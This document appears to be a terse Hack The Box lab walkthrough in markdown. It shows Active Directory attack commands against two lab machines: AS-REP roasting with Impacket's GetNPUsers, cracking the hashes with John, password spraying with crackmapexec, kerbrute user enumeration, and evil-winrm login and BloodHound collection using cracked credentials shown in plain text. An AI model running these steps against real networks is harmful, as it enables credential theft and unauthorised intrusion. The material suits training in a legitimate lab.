# Description
Impacket is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols. Impacket contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.

# Example 1
```
less GetNPUsers.py
q : exit
```
![image](https://user-images.githubusercontent.com/33616880/228759459-6e13ea91-f366-4387-a861-66122a90ddaf.png)
![image](https://user-images.githubusercontent.com/33616880/228759248-caf71e41-54e0-4a86-9cf4-3c418cf74f47.png)


```
./GetNPUsers.py -h
```
```
./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
```
![image](https://user-images.githubusercontent.com/33616880/228159592-2214bff1-27e1-4ff5-852f-b3a658b0f6b2.png)

```
john hash -w=/usr/share/wordlists/rockyou.txt
```
![image](https://user-images.githubusercontent.com/33616880/228169174-45a02231-cbdc-4d77-84cc-4af9a1d90eec.png)
```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```
![image](https://user-images.githubusercontent.com/33616880/228171925-c17175e2-5455-4ca7-aa4f-f3add5fde248.png)

# Example 2
```
./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d BLACKFIELD.local /home/itsec/Documents/HTB-Blackfield/users2.txt
audit2020@BLACKFIELD.local
svc_backup@BLACKFIELD.local
support@BLACKFIELD.local
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8351ac91-ddd0-4beb-b7a5-07b826d5ea17)

```
crackmapexec smb 10.10.10.192 -u users1.txt -p /usr/share/wordlists/rockyou.txt
smbclient -L \\\\10.10.10.192\\ -U BLACKFIELD.local/audit2020@BLACKFIELD.local
```
![image](https://github.com/regarmulia/HTB/assets/33616880/85ac138e-3b1c-425d-a7e0-02a1459f064c)

![image](https://github.com/regarmulia/HTB/assets/33616880/8e443d07-17a2-4bb0-9581-bce86b966fce)

```
./GetNPUsers.py blackfield.local/ -no-pass -usersfile users1.txt -dc-ip 10.10.10.192
john hash1 -w=/usr/share/wordlists/rockyou.txt
#00^BlackKnight
```
![image](https://github.com/regarmulia/HTB/assets/33616880/cd8865bb-864f-46ec-a29a-696611744770)

```
neo4j console
bloodhound
git clone https://github.com/dirkjanm/BloodHound.py.git
python3 bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c All
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5f5252e0-d56f-416b-aaf0-8199b768611d)

![image](https://github.com/regarmulia/HTB/assets/33616880/690ab874-b2ed-44ad-bcb1-7c905f601270)

![image](https://github.com/regarmulia/HTB/assets/33616880/32338d7d-8555-4e26-a012-c3c73abde14f)

```
Raw Query: MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ce0c48d4-04cd-4b3e-a357-3cc24d23fd19)

